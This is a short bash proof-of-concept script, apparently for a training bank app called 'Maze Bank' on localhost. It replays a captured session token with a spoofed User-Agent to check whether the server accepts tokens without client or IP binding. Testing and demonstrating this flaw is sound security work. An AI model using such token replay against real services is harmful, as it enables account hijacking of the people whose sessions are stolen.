#!/usr/bin/env bash
# ==============================================================================
# PoC: Session Hijacking & Missing Token Binding
# Demonstrates reusing a captured session token from an arbitrary client/header.
# ==============================================================================

TARGET_URL="${1:-http://localhost:5000}"
SESSION_TOKEN="${2:-demo-alice-session-token}"

echo "========================================================"
echo "🎯 Maze Bank PoC: Session Hijacking / Lack of Binding"
echo "Target: ${TARGET_URL}"
echo "Token:  ${SESSION_TOKEN}"
echo "========================================================"

echo ""
echo "[*] Step 1: Querying authenticated endpoint /api/auth/session with token..."
echo ""

RESPONSE=$(curl -s -X GET "${TARGET_URL}/api/auth/session" \
  -H "Authorization: Bearer ${SESSION_TOKEN}" \
  -H "User-Agent: AttackerBrowser/1.0")

echo "[*] Response received:"
echo "${RESPONSE}"
echo ""

if echo "${RESPONSE}" | grep -q '"authenticated":true' || echo "${RESPONSE}" | grep -q '"username"'; then
  echo "✅ VULNERABILITY CONFIRMED: Token accepted without client/IP binding!"
  exit 0
else
  echo "[!] Token not active or target rejected. Try logging in first to get a live token."
  exit 1
fi
